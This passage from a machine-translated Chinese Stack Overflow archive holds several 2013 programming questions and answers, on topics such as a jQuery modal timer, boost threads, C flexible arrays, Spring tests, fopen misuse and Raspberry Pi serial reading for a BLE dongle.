但我希望的是，一旦页面加载完成，5 秒后自动打开模式。我希望这自然意味着一个 DIV 具有给定的模式 ID，包括页脚中的 jQuery - 基本上相同的设置，除了调用它的 javascript 本身不包括监听给定链接的点击一个特定的 ID，而是简单地等待 DOM 加载，等待指定的秒数（或毫秒），然后自动触发。

谁能告诉我这是如何实现的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T17:44:19.947

你有可能使用Foundation 4吗？语法稍微更改为：

```
<script type="text/javascript">
  $(document).ready(function() {
    setTimeout(function(){
      $("#myModal").foundation('reveal', 'open');
    }, 5000);
  });
</script> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T13:10:48.647

您可以像往常一样进行设置，但只需添加一个手动点击触发器。

`setTimeout`接受两个参数。一个函数，以及运行它之前的等待时间（以毫秒为单位）。

```
<script type="text/javascript">
$(document).ready(function() {
    $("#openMyModal").click(function() {
        $("#myModal").reveal();
    });

    setTimeout(function(){
      $("#openMyModal").click();
    }, 5000);
});
</script> 
```

或者，如果您根本不想要链接，只需调用reveal 方法。

```
<script type="text/javascript">
$(document).ready(function() {

    setTimeout(function(){
      $("#myModal").reveal();
    }, 5000);

});
</script> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-25T12:55:11.370

我已经使用以下内容在页面打开时触发 Zurb 的模态，但有时间延迟。

```
jQuery(document).ready(function($) {

    /* Pop-up
    ================================================= */
    $(function() {
        function showpanel() {
        $('.reveal-modal').reveal({
            animation: 'fade',
            animationspeed: 800
        });
        }
        setTimeout(showpanel, 4000)
    }); 
}); 
```

# c++ - 如何使用 boost 运行线程另一个带有回调的对象函数

> ID：15879723
> 
> 赞同：0
> 
> 时间：2013-04-08T12:59:28.183
> 
> 标签：c++, boost, asynchronous

我试图运行 boost::thread 一些带有回调的对象函数

在 A 类中有一个这样的函数：

```
void DoWork(int (*callback)(float))   
{
float variable = 0.0f;

 boost::this_thread::sleep(boost::posix_time::seconds(1));
int result = f(variable);
} 
```

在主要：

```
int SomeCallback(float variable)
{
  int result;
  cout<<"Callback called"<<endl;
  //Interpret variable

  return result;
}

int main(){
  A* file = new A();

boost::thread bt(&A::DoWork, file , &SomeCallback );
cout<<"Asyns func called"<<endl;
bt.join();
cout<<"main done"<<endl; 
} 
```

该行`boost::thread bt(&A::DoWork, file , &SomeCallback );`导致**链接器**错误。我从本教程中获得的这个电话：http: [//antonym.org/2009/05/threading-with-boost---part-i-creating-threads.html](http://antonym.org/2009/05/threading-with-boost---part-i-creating-threads.html)。

错误是：

```
unresolved external symbol "public: void __thiscall A::DoWork(int (__cdecl*)(float))" (?DoWork@A@@QAEXP6AHM@Z@Z) referenced in function _main 
```

这段代码有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T13:11:10.227

未*解析的外部符号*是链接器错误，这意味着链接器找不到`A::DoWork`. 从您的代码中，我看不到您实际定义函数的位置，但让我猜猜：

```
//A.h

class A {
  //...
public:
  void DoWork(int (*callback)(float)); //declaration
};

//A.cpp

void DoWork(int (*callback)(float))   
{
  float variable = 0.0f;

  boost::this_thread::sleep(boost::posix_time::seconds(1));
  int result = f(variable);
} 
```

即*，如果*定义与您在 .cpp 文件中发布的完全一样，那么错误是您没有定义`A::DoWork`而是定义了一个新的自由函数。

那么正确的定义是：

```
//A.cpp

void A::DoWork(int (*callback)(float))   //define it as a member of A!
{
  float variable = 0.0f;

  boost::this_thread::sleep(boost::posix_time::seconds(1));
  int result = f(variable);
} 
```

如果我的猜测是错误的，请提供[SSCCE](http://sscce.org)，以便我们评估真正的问题是什么。

# javascript - 如何在显示/隐藏切换中仅使用“显示”？

> ID：15879724
> 
> 赞同：3
> 
> 时间：2013-04-08T12:59:28.760
> 
> 标签：javascript, jquery, html, css

我正在使用以下脚本在按钮单击时显示/隐藏 div

```
function showHide(divID){
if (document.getElementById(divID).style.display == "none") {
    $('#'+divID).fadeIn(3000);

} else {
    $('#'+divID).fadeOut(3000);
}
} 
```

这是我的 HTML：

```
<button onClick="showHide('hideDiv',this.id)" type="button">English</button>
<button onClick="showHide('hideDiv',this.id)" type="button">Math</button>
<button onClick="showHide('hideDiv',this.id)" type="button">French</button> 
```

并使用单个 div 在单击时显示按钮的内容

```
<div id="hideDiv" style="display:none;">
    <p>A painting workshop in the early Renaissance probably resembled</p>
</div> 
```

当我点击英文后的数学时，内容会隐藏，再点击一次，内容会再次显示。但是，我想在用户单击任何按钮时显示内容，我想在这里隐藏“隐藏”属性，以便用户可以看到他单击的任何按钮的内容。

这是小提琴链接[http://jsfiddle.net/ytyAd/](http://jsfiddle.net/ytyAd/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:28:15.587

这就是我认为您正在寻找的... [http://jsfiddle.net/ytyAd/10/](http://jsfiddle.net/ytyAd/10/)

JS 把它放在 $(document).ready() 中：

```
$("button.showHide").click( function() {
    var content = $(this).text();
    $("#hideDiv > p").hide("slow");
    $("#hideDiv #"+content).show("slow");
}); 
```

HTML：

```
<button class="showHide" type="button">English</button>
<button class="showHide" type="button">Math</button>
<button class="showHide" type="button">French</button>

<div id="hideDiv">
    <p id="English" style="display:none;">english stuff</p>
    <p id="Math" style="display:none;">math stuff</p>
    <p id="French" style="display:none;">french stuff</p>
</div> 
```

当然，您可以使用它（不同的动画、回调等）以使其适合您的上下文

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:30:42.833

HTML：

```
<div class="buttons">
<button id="engbutton" class="button" type="button">English</button>
<button id="mathbutton" class="button" type="button">Math</button>
<button id="frenchbutton" class="button" type="button">French</button>
</div>
<div class="contents">    
<div id="engbuttonDiv" style="display:none;" class="ContentDiv">
    <p>This is English Div</p>
</div>
<div id="mathbuttonDiv" style="display:none;" class="ContentDiv">
    <p>This is Maths Div</p>
</div>
<div id="frenchbuttonDiv" style="display:none;" class="ContentDiv">
    <p>This is French Div</p>
</div>
</div> 
```

JS：

```
 $('.button').on('click', function(){
        $('.contents').find('div').hide();
        var getMessageDiv = '#'+$(this).attr('id')+"Div";
        if ($(getMessageDiv).is(':visible'))
        $(getMessageDiv).fadeOut();
         else 
        $(getMessageDiv).fadeIn();
    }) 
```

**[现场演示](http://jsfiddle.net/aoguzhan/HHq4J/)**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T13:16:19.267

你需要这样的东西吗？

[**现场演示在这里**](http://jsfiddle.net/A36cM/2/)

**HTML**

```
<button id="engbutton" class="button" type="button">English</button>
<button id="mathbutton" class="button" type="button">Math</button>
<button id="frenchbutton" class="button" type="button">French</button>
<div id="engbuttonDiv" style="display:none;" class="ContentDiv">
    <p>This is English Div</p>
</div>
<div id="mathbuttonDiv" style="display:none;" class="ContentDiv">
    <p>This is Maths Div</p>
</div>
<div id="frenchbuttonDiv" style="display:none;" class="ContentDiv">
    <p>This is French Div</p>
</div> 
```

**CSS**

```
.ContentDiv
{
    height:50px;
    width:200px;
    background:green;
} 
```

**jQuery**

```
 $(".button").click(function(){
        $(".ContentDiv").hide();
        var divid = $(this).attr("id") + "Div";
        if($("#"+divid).css('display') == 'none')
        {
            $("#"+divid).fadeIn(3000);
        }
        else
        {
            $("#"+divid).fadeOut(3000);
        }  
    }); 
```

# c - C语言结构中的动态结构数组

> ID：15879730
> 
> 赞同：0
> 
> 时间：2013-04-08T12:59:48.547
> 
> 标签：c, dynamic, malloc, structure

我对 C 编程很陌生，我偶然发现了一些棘手的问题。我想要做的是在 C 中的另一个结构中定义一个动态结构数组。

这是我的代码：首先我定义结构形状：

```
struct cap_prof_arrays
   {
   double zarr;
   double profil;
   double sx;
   double sy;
   double d_arr;
   };

struct cap_profile
   {
   int nmax;
   double rtot1;
   double rtot2;
   double cl;
   double binsize;
   struct cap_prof_arrays arr[]; /*Will get proper size allocated to it later*/
   };

void read_cap_profile(struct inp_file cap) /* I defined the inp_file structure cap before, everything works great on that account */
   {
    FILE *fptr;
    int i, n_tmp;
    struct cap_profile profile;

    fptr = fopen(cap.prf,"r");
    fscanf(fptr,"%d",&profile.nmax);
    // Increase structure array sizes to fit demands
    profile.arr = malloc(sizeof(struct cap_profile)+profile.nmax*sizeof(double));
    //continue reading data
    for(i=0; i<=profile.nmax; i++){
      fscanf(fptr,"%lf %lf",&profile.arr[i].zarr,&profile.arr[i].profil);
      }
    fclose(fptr);

    //rest of program 
```

现在，主要问题是在编译期间，无论我尝试什么，我都会在尝试执行内存分配的那一行出现一些错误。我想知道你们中是否有人可以帮助我？我意识到我可以通过在结构声明期间定义一个非常大的数组大小来让我的生活更轻松，但我很想用动态调整大小来做到这一点。所以我希望你能帮助我:)

非常感谢！

**EDIT1：** 所以我根据我在这里得到的答案改变了一些东西。这是我的程序现在的样子：

```
struct cap_prof_arrays
  {
  double zarr;
  double profil;
  double sx;
  double sy;
  double d_arr;
  };

struct cap_profile
  {
  int nmax;
  double rtot1;
  double rtot2;
  double cl;
  double binsize;
  struct cap_prof_arrays *arr; /* will get proper size allocated to it later */
  };

struct cap_profile read_cap_profile(struct inp_file cap)
{
 FILE *fptr;
 int i, n_tmp;
// struct cap_profile profile;

 printf("Reading capillary profiles...\n");
 fptr = fopen(cap.prf,"r"); /* READING THE CAPILLARY PROFILE */
 if(fptr == NULL){
   printf("%s file does not exist.\n",cap.prf);
   exit(0);
   }
 fscanf(fptr,"%d",&n_tmp);
 // increase structure array sizes to fit demands;
 struct cap_profile *profile = malloc(sizeof(*profile)+(n_tmp+1)*sizeof(*profile->arr));
 profile->nmax = n_tmp;
 // continue reading the data;
 for(i=0; i<=profile->nmax; i++){
   fscanf(fptr,"%lf %lf",&profile->arr[i].zarr,&profile->arr[i].profil);
   }
 fclose(fptr);

 n_tmp = profile->nmax;

 fptr = fopen(cap.axs,"r"); /* READING THE AXIS DEFINITION FILE */
 if(fptr == NULL){
   printf("%s file does not exist.\n",cap.axs);
   exit(0);
   }
 fscanf(fptr,"%d",&profile->nmax);
 if(profile->nmax != n_tmp){
   printf("Inconsistent axis.dat file: number of intervals different.\n");
   exit(0);
   }
 for(i=0; i<=profile->nmax; i++)
   fscanf(fptr,"%lf %lf %lf",&profile->arr[i].zarr,&profile->arr[i].sx,&profile->arr[i].sy);
 fclose(fptr);

 fptr = fopen(cap.out,"r"); /* READING THE OUTER PROFILE */
 if(fptr == NULL){
   printf("%s file does not exist.\n",cap.out);
   exit(0);
   }
 for(i=0; i<=profile->nmax; i++)
   fscanf(fptr,"%lf %lf",&profile->arr[i].zarr,&profile->arr[i].d_arr);
 fclose(fptr);

 profile->rtot1 = profile->arr[0].d_arr;
 profile->rtot2 = profile->arr[profile->nmax].d_arr;
 profile->cl = profile->arr[profile->nmax].zarr;
 cap.d_screen = cap.d_screen + cap.d_source + profile->cl;
 profile->binsize = 20.e-4;

 return *profile;
} 
```

我现在得到的错误是分段错误（核心转储）错误（在程序测试期间，而不是在编译期间）。我想我的指针又做错了，但我真的不明白我做错了什么......有什么帮助吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-08T13:08:56.280

您不能在与结构分开的结构内分配数组。相反，对于灵活的数组成员^*，请执行以下操作：

将要分配的元素数量读入一个`int`，也许是一个命名`nmax`的（一个单独`int`的，而不是`nmax`结构中的成员）。

为整个结构加上数组分配空间，并将该空间的地址分配给一个指针：

```
struct cap_profile *profile = malloc(sizeof *profile + nmax * sizeof *profile->arr); 
```

* * *

^*一个灵活的数组成员是一个在结构末尾具有未指定主要维度的数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:02:45.260

当您使用`malloc`（或类似函数）分配内存时，它会返回一个*指针*。您不能将此指针分配给数组。换句话说，一旦创建，您就不能使数组指向其他内容。

您应该做的是将数组声明为指针。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T14:28:18.693

你可以这样做：

```
struct cap_profile {
  int nmax;
  struct cap_prof_arrays **arr;
}; 
```

然后像这样分配它：

```
struct cap_profile *profile = calloc(1, sizeof(*profile));

fscanf(fptr, "%d", profile->nmax);
profile->arr = calloc(1, profile->nmax * sizeof(*(profile->arr)));
for (i = 0; i < profile->nmax; i++) {
  profile->arr[i] = calloc(1, sizeof(*(profile->arr[i])));
  fscanf(fptr, "%lf %lf", &profile->arr[i]->zarr, &profile->arr[i]->profil);
} 
```

另外两点：

1.  如果要在该函数之外使用其中的值，则分配 cap_profile 结构并从 read_cap_profile() 函数返回指向它的指针。
2.  'for' 循环应该有 <profile->nmax，而不是 <=

# java - Spring 3.2：@WebAppConfiguration 打破了现有的@Transactional 测试

> ID：15879732
> 
> 赞同：1
> 
> 时间：2013-04-08T12:59:51.670
> 
> 标签：java, spring, transactions, spring-roo

问候。
我有一个 Roo 生成的网络应用程序。我想测试我的控制器。所以我使用spring-test-3.2。
使用 STS 3.2。
用于测试的嵌入式 Derby。
当控制器测试被夹在两个集成测试之间时，测试套件会失败 - 中断其后的集成测试。如果我@Ignore 控制器测试，套件运行良好。这个集成测试既有 Roo 生成的，也有我自己的测试方法。
我搜索了很多 - 但无法解释这种行为。我怀疑交易没有正确回滚，但这似乎很好（日志很好）。我只有一个空的控制器测试方法。我认为出于某种原因我的@ContextConfiguration 是问题...

之前的集成测试：

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = "classpath:/META-INF/spring /applicationContext*.xml")
@Transactional
public class CompanyServiceImplTest { 
```

控制器测试：

```
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(value = {
    "file:src/main/resources/META-INF/sprin/applicationContext.xml",
    "file:src/main/webapp/WEB-INF/spring/webmvc-config.xml" })
@Transactional 
```

之后的集成测试（这会中断）

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = "classpath:/META-INF/spring/applicationContext*.xml")
@Transactional
@RooIntegrationTest(entity = Status.class)
public class StatusIntegrationTest { 
```

将不胜感激任何指针...

--- 快乐阿图尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-10T12:52:54.733

这可能是由[https://jira.springsource.org/browse/SPR-6121引起的](https://jira.springsource.org/browse/SPR-6121)

对我有用的解决方法是通过将@WebAppConfiguration 添加到所有单元测试并确保它们都具有相同的@ContextConfiguration 来使所有单元测试使用相同的应用程序上下文。

您看起来像是在使用 Spring Roo。为了避免编辑所有现有的单元测试，您可以为您的测试制作 webmvc-config.xml 的副本，重命名/移动它以匹配 applicationContext*.xml 模式。

可以使用方面来向现有测试添加 @WebAppConfiguration 注解：

```
package com.foo.bar;

import org.springframework.test.context.web.WebAppConfiguration;

privileged aspect WebAppConfigurationAspect {
   declare @type: com.foo.bar..*Test: @WebAppConfiguration;
} 
```

# android - 测试 Android 片段

> ID：15879733
> 
> 赞同：5
> 
> 时间：2013-04-08T12:59:55.420
> 
> 标签：android, junit, android-fragments

我在无 UI 片段中有一个业务逻辑，我必须对其进行测试。我尝试了 2 个选项，但都失败了。

**1\. 使用 AndroidTestCase 并创建模拟活动。**

以下代码

```
@Override
protected void setUp() {
    Intent i = new Intent(getTestContext(), TestActivity.class);
    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    getTestContext().startActivity(i);
} 
```

抛出异常

```
Permission denied: checkComponentPermission() reqUid=10104
java.lang.SecurityException: Permission Denial: starting Intent { flg=0x10000000 cmp=com.xxx.iabsample.test/.TestActivity } from ProcessRecord{40769510 28116:com.xxx.iabsample/10070  (pid=28116, uid=10070) requires null 
```

**2\. 使用带有模拟活动的 ActivityInstrumentationTestCase2**

代码

```
public class IabTest extends ActivityInstrumentationTestCase2<TestActivity> {
    public IabTest() {
        super("com.xxx.iabsample.test", TestActivity.class);
    }
} 
```

抛出异常

```
java.lang.RuntimeException: Unable to resolve activity for: Intent { act=android.intent.action.MAIN flg=0x10000000 cmp=com.xxx.iabsample/.test.TestActivity } 
```

似乎它试图从测试目标应用程序而不是测试应用程序启动活动。

那么，测试片段的正确方法是什么？

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-06-26T06:28:48.903

```
//Please try to use bellow code.

// activity layout  main.xml
<LinearLayout
    android:id="@+id/frags"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="horizontal" >

    <ListView
        android:id="@+id/number_list"
        android:layout_width="250dip"
        android:layout_height="match_parent" />

    <fragment
        android:id="@+id/the_frag"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        class="com.example.fragmenttest.TestFragment" />

</LinearLayout>

//Fragments java class.

 public class TestFragment extends Fragment

{

    private int nAndroids;

    public TestFragment() {

    }

   /**
    * Constructor for being created explicitly
    */
   public TestFragment(int nAndroids) {
        this.nAndroids = nAndroids;
    }

    /**
     * If we are being created with saved state, restore our state
     */
    @Override
    public void onCreate(Bundle saved) {
        super.onCreate(saved);
        if (null != saved) {
            nAndroids = saved.getInt("nAndroids");
        }
    }

    /**
     * Save the number of Androids to be displayed
     */
    @Override
    public void onSaveInstanceState(Bundle toSave) {
        toSave.putInt("nAndroids", nAndroids);
    }

    /**
     * Make a grid and fill it with n Androids
     */
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle saved) {
        int n;
        Context c = getActivity().getApplicationContext();
        LinearLayout l = new LinearLayout(c);
        for (n = 0; n < nAndroids; n++) {
            ImageView i = new ImageView(c);
            i.setImageResource(R.drawable.android);
            l.addView(i);
            TranslateAnimation a = new TranslateAnimation(-50, 30, 0, 0);
            a.setDuration(1000);

            l.startAnimation(a);
            a.setFillAfter(true);
        }
        return l;
    }
}

// Activity

public class FragmentTestActivity extends FragmentActivity implements OnItemClickListener {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        ListView l = (ListView) findViewById(R.id.number_list);
        ArrayAdapter numbers = new ArrayAdapter<String>(getApplicationContext(),
                android.R.layout.simple_list_item_1, 
                new String [] {
            "one", "two", "three", "four", "five", "six"
        });
        l.setAdapter(numbers);
        l.setOnItemClickListener(this);
    }

    /**
     * Add a Fragment to our stack with n Androids in it
     */
    private void stackAFragment(int nAndroids) {
        Fragment f = new TestFragment(nAndroids);

        FragmentTransaction ft = getSupportFragmentManager().beginTransaction();
        ft.replace(R.id.the_frag, f);
        ft.setTransition(FragmentTransaction.TRANSIT_FRAGMENT_OPEN);
        ft.addToBackStack(null);
        ft.commit();
    }

    /**
     * Called when a number gets clicked
     */
    public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
        stackAFragment(position + 1);
    }
} 
```

# visual-studio-lightswitch - 灯开关计算属性不可搜索

> ID：15879749
> 
> 赞同：0
> 
> 时间：2013-04-08T13:00:43.690
> 
> 标签：visual-studio-lightswitch

我有一个具有 Id 属性的实体，我想让该属性可搜索。我尝试按照此处的建议创建计算属性：

[http://therearefourlightswitches.blogspot.co.nz/2012/02/making-integers-searchable.html](http://therearefourlightswitches.blogspot.co.nz/2012/02/making-integers-searchable.html)

但是，计算属性没有“可搜索”复选框。将给予任何帮助。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T13:53:00.307

只有**字符串**属性是可搜索的。计算属性**不可**搜索。

做你想做的事情的唯一方法是向表中添加一个真正的字符串属性（而不是添加一个计算属性），然后在实体的*保存*方法中，将 ID 转换为字符串并将其存储为字符串属性。您需要对实体的*添加*方法执行相同的操作。

您可以使用计算属性来设置字符串属性的值，但这意味着要添加两个属性。如果您可以忍受，它将更容易在**添加**和**更新**方法中设置值，但您也可以将代码从计算属性移到静态类/模块并从这两种方法中调用.

编辑：

实际上，您提供的链接使用的方法根本没有使用计算属性。基本上就是我描述的。但他建议使用*Changed*方法，这实际上是比我上面描述的更好的方法。使用*Changed*方法意味着您不必同时使用*Adding*和*Updating*方法，并且您也不需要两个属性。

# sql-server - Meteor JS 和 SQL Server

> ID：15879752
> 
> 赞同：10
> 
> 时间：2013-04-08T13:00:46.620
> 
> 标签：sql-server, node.js, driver, meteor

Meteor.js 是否有一种简单的方法可以像与 MongoDB 一样与 SQL Server 交互？例如，通过使用此处找到的 Node.js MSSQL 驱动程序：http: [//www.microsoft.com/en-us/download/details.aspx?id=](http://www.microsoft.com/en-us/download/details.aspx?id=29995) 29995 - 但理想情况下，这需要在 linux 中工作。

我发现的最接近的是[乏味](https://github.com/pekim/tedious)的- 我如何在 Meteor 中使用这个或其他替代方法？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-10T15:07:08.740

您可能已经阅读过流星文档。你会发现它在[那里](http://docs.meteor.com/#dataandsecurity)给出：

> 当前版本的 Meteor 支持流行的文档数据库 MongoDB，本节中的示例使用 MongoDB API。未来的版本将包括对其他数据库的支持。

因此，在“那个”未来版本之前，您将不会获得对其他数据库的本机支持。最好的办法是使用允许连接 MS-SQL 的包。您可以查看此处列出的软件包或[在](https://npmjs.org/browse/keyword/mssql)[此处](https://github.com/joyent/node/wiki/modules#wiki-db-mssql)搜索它们。他们之中有一些是：

1.  [https://npmjs.org/package/乏味](https://npmjs.org/package/tedious)
2.  [https://npmjs.org/package/msnodesql](https://npmjs.org/package/msnodesql)
3.  [https://npmjs.org/package/tds](https://npmjs.org/package/tds)

最好使用流行且最近更新的版本。

# c - fopen 上的分段错误

> ID：15879761
> 
> 赞同：0
> 
> 时间：2013-04-08T13:01:00.097
> 
> 标签：c

我在代码的第一行遇到了一个奇怪的分段错误。

我所做的就是打电话

```
FILE *src = fopen(argv[1], 'r'); 
```

我在 gdb 中的消息出现 seg 错误...

程序收到信号 SIGSEGV，分段错误。

```
0x00007ffff779956d in _IO_file_fopen () from /lib/x86_64-linux-gnu/libc.so.6 
```

我将文件名直接复制到运行时执行中。想法？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-08T13:02:21.463

的第二个参数[`fopen()`](http://linux.die.net/man/3/fopen)应该是一个字符串，而不是`char`：

```
FILE *src = fopen(argv[1], "r"); 
```

注意双引号。

打开编译器警告并密切关注它们总是一个好主意。我的编译器选择了不正确的参数：

```
test.c:4:1: warning: passing argument 2 of 'fopen' makes pointer from integer without a cast [enabled by default]
In file included from test.c:1:0:
/usr/include/stdio.h:250:7: note: expected 'const char *' but argument is of type 'int' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:02:06.583

可能传递的字符串不是以 null 结尾的，或者您正在访问 argv 上的无效索引

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T14:46:41.437

代替

```
FILE *src = fopen(argv[1], 'r'); 
```

你需要写

```
FILE *src = fopen(argv[1], "r"); 
```

# raspberry-pi - 树莓派和 BLED112 (Bluegiga)

> ID：15879764
> 
> 赞同：3
> 
> 时间：2013-04-08T13:01:14.707
> 
> 标签：raspberry-pi, bluetooth-lowenergy, raspbian

我有两个蓝牙设备（来自 bluegiga 的 bled112）。其中之一连接到 RPI 并从其他设备接收 RSSI 和硬件地址。它在 Windows 和 ubuntu 上运行良好，但在树莓派上，从设备文件 (/dev/ttyACM0) 读取时出现问题。

我正在使用 Wheezy 3.6.11，全部更新，安装了 bluez。

那是我的程序，我用来阅读的内容：

```
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>

#include "cmd_def.h"

volatile int serial_fd;

void output(uint8 len1, uint8* data1, uint16 len2, uint8* data2)
{
    int written;

    written = write(serial_fd, data1, len1);
    if(written < 0) {
        fprintf(stderr, "ERROR: Writing data. %d\n", (int)errno);
        exit(-1);
    } 
    printf("WRITE1: %d bytes ; ", written);
    written = write(serial_fd, data2, len2);
    if(written < 0) {
        fprintf(stderr, "ERROR: Writing data. %d\n", (int)errno);
        exit(-1);
    }
    printf("WRITE2: %d bytes\n", written);
}

int read_message()
{
    int rread;
    const struct ble_msg *apimsg;
    struct ble_header apihdr;
    unsigned char data[256];//enough for BLE
    //read header
    printf("\t\tread_message entered\n");
    rread = read(serial_fd, (unsigned char*)&apihdr, 4);
    if(rread < 0) {
        return errno;
    } else if(!rread) {
        return 0;
    }
    printf("READ: header %d bytes ; ", rread);
    //read rest if needed
    if(apihdr.lolen)
    {
        rread = read(serial_fd, data, apihdr.lolen);
        if(rread < 0) {
            return errno;
        }
    }
    printf("READ: data %d bytes ; ", rread);
    apimsg=ble_get_msg_hdr(apihdr);
    if(!apimsg)
    {
        fprintf(stderr, "ERROR: Message not found:%d:%d\n",(int)apihdr.cls,            (int)apihdr.command);
        return -1;
    }
    apimsg->handler(data);

    return 0;
}

int main(int argc, char *argv[] )
{
    char* portname;

    portname = "/dev/ttyACM0";

    serial_fd = open(portname, O_RDWR | O_SYNC);
    if (serial_fd < 0)
    {
        fprintf (stderr, "error %d opening %s: %s", errno, portname, strerror (errno));
        return -1;
    }

    bglib_output = output;

    //stop previous operation
    ble_cmd_gap_end_procedure();
    //get connection status,current command will be handled in response
    ble_cmd_connection_get_status(0);

    //Message loop
    while(1)
    {
        if(read_message())
        {
            fprintf(stderr, "Error reading message\n");
            break;
        }
    }

    return 0;
} 
```

RPI 的输出为：

```
$ sudo scanApp
WRITE1: 4 bytes ; WRITE2: 0 bytes
WRITE1: 5 bytes ; WRITE2: 0 bytes
            read_message entered 
```

在这部分之后，它在 read-function 中无限运行。如果有人能告诉我，我会非常感激，为什么它在树莓派上不起作用？

**编辑：** 找到了 uart 的解决方案：

```
#include <termios.h>

int serial_handle;

int uart_open(char *port){
    struct termios options;
    int i;

    serial_handle = open(port, (O_RDWR | O_NOCTTY));
    if(serial_handle < 0)
        return -1;

    tcgetattr(serial_handle, &options); //get the current options for the port...
    cfsetispeed(&options, B115200);     //set Baud rate to 115200
    cfsetospeed(&options, B115200);     //enable the receiver and set param...
    options.c_cflag &= ~(PARENB | CSTOPB | CSIZE | CRTSCTS | HUPCL);
    options.c_cflag |= (CS8 | CLOCAL | CREAD);
    options.c_lflag &= ~(ICANON | ISIG | ECHO | ECHOE | ECHOK | ECHONL | ECHOCTL | ECHOPRT | ECHOKE | IEXTEN);
    options.c_iflag &= ~(INPCK | IXON | IXOFF | IXANY | ICRNL);
    options.c_oflag &= ~(OPOST | ONLCR);
    for ( i = 0; i < sizeof(options.c_cc); i++ )
        options.c_cc[i] = _POSIX_VDISABLE;
    options.c_cc[VTIME] = 0;
    options.c_cc[VMIN] = 1;
    //set new opt for the port
    tcsetattr(serial_handle, TCSAFLUSH, &options);
    return 0;
}

int uart_close(){
        close(serial_handle);
}

//write to uart_port
 int uart_tx(int len, unsigned char *data){
     ssize_t written;
     while(len){
        written = write(serial_handle, data, len);
        if(!written)
            return -1;
        len -= written;
        data += len;
     }
  return 0;
 }

 //read from uart_port
 int uart_rx(int len, unsigned char *data, int timeout_ms){
    int l=len;
    ssize_t rread;
    struct termios options;
    tcgetattr(serial_handle, &options);
    options.c_cc[VTIME] = timeout_ms/100;
    options.c_cc[VMIN] = 0;
    tcsetattr(serial_handle, TCSANOW, &options);
    while(len){
            rread = read(serial_handle, data, len);
            if(!rread){
                 return 0;
            } else if(rread < 0) {
                return -1;
            }
            len-=rread;
            data+=len;
    }
    return l;
}

int main(){
     char* portname = "/dev/ttyACM0";
     serial_fd = uart_open(portname);
     if (serial_fd < 0){
         fprintf (stderr, "error %d opening %s: %s", errno, portname, strerror (errno));
         return -1;
     }

     bglib_output = output;
     //reset dongle
     ble_cmd_system_reset(0);
     uart_close();
     do{
         usleep(500000);
         //and start again
     }while(uart_open(portname));

     //stop previous operation
     ble_cmd_gap_end_procedure();
     //get connection status,current command will be handled in response
    ble_cmd_connection_get_status(0);

    //Message loop
    while(1){
        if(read_message()){
            fprintf(stderr, "Error reading message\n");
            break;
        }
    }

    uart_close();
    return 0;
} 
```

在输出（）中使用：

```
 written = uart_tx(len1, data1);
 written = uart_tx(len2, data2); 
```

在 read_message() 中：

```
 rread = uart_rx(sizeof(apihdr), (unsigned char*)&apihdr, 1000);
 rread = uart_rx(apihdr.lolen, data, 1000); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-29T19:45:40.200

如果 Java 是在您的 Raspberry Pi 上运行的选项，您可以[试试这个 BLE 112 Java API](https://github.com/SINTEF-9012/bglib)

在[Raspberry Pi 上安装 Java](http://www.raspberrypi.org/archives/4920) sudo apt-get update && sudo apt-get install oracle-java7-jdk

# java - 使用注释在服务调用之前/之后注入我的代码

> ID：15879765
> 
> 赞同：0
> 
> 时间：2013-04-08T13:01:15.457
> 
> 标签：java, annotations, interceptor

该服务是一个spring bean，它是@autowired 进入我的班级：

```
public class MyClass {
    @Autowired
    private Service service;

    private void myMethod() {
        service.call();
    }
} 
```

call() 方法可能会抛出异常，所以我用 try-catch 行包装它：

```
public class MyClass {
    @Autowired
    private Service service;

    private void myMethod() {
        try {
            service.call();
        } catch (Exception e) {
            // do some logging
        }
    }
} 
```

如何编写自定义注释并自动执行此操作？像这样：

```
public class MyClass {
    @Monitored
    @Autowired
    private Service service;

    private void myMethod() {
        // it will be logged if call() throws exception
        service.call();
    }
} 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:16:53.467

例子有很多，例如[基于Spring Annotation的AOP拦截父类中实现的方法](https://stackoverflow.com/questions/12670617/spring-annotation-based-aop-to-intercept-method-implemented-in-parent-class)或[基于Spring Annotation的AOP和拦截球](http://eggsylife.co.uk/2010/02/03/spring-annotation-based-aop-and-intercepting-the-ball/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:37:34.770

你应该有一个`advice`你想要的方法。`point-cut`并为您想要被拦截的方法定义一个。查看[此](http://static.springsource.org/spring/docs/3.0.x/reference/aop-api.html)内容以获取有关不同类型建议的更多信息（我相信您的情况`Before`和`After`或是`Around`合适的）和一些示例。

